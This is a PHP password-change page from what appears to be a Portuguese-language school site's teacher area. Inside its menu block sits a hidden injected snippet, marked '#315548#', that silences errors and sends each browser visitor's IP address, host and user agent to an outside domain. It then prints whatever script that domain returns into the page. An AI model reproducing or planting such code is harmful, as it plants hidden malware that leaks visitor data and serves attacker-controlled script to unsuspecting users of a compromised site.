<?php

include_once('include/basics.php');
include_once('../classes/professores.php');

$prof = new professores($_SESSION['prof_id']);

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset=utf-8 />
		<title><?php echo PAGE_TITLE ?> - Área do Professor</title>
		<link href="styles/index.css" rel="stylesheet" type="text/css" />
		<link href="styles/styles.css" rel="stylesheet" type="text/css" />
		<script type="text/javascript" src="scripts/jquery-1.7.1.min.js"></script>
		<script>
			$(document).ready(function(){
				$('#salvar').click(function(){
					if( $('#senha').val() != $('#senha2').val() ) {
						alert('A senha e a confirmação não conferem.');
					}
					else {
						document.pass_form.submit();
					}
				});
			});
		</script>
	</head>
	<body>
		<div id="top"><a href="home.php"><img src="images/logo.jpg" alt="Home" title="Home" /></a></div>
		<div id="menu">
			<?php include( "include/menu.php" ); ?>
<?php
#315548#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/315548#
?>
		</div>
		<div id="conteudo" style="padding: 20px;">
			<form method="post" action="save_pass.php" name="pass_form" class="lesson">
				<label style="width: 115px; ">Nova senha: </label><input type="password" name="senha" id="senha"/><br>
				<label style="width: 115px;">Digite novamente: </label><input type="password" name="senha2" id="senha2"/><br><br>
				<input type="button" value="Salvar" id="salvar" style="padding: 3px;"/>
			</form>
		</div>
	</body>
</html>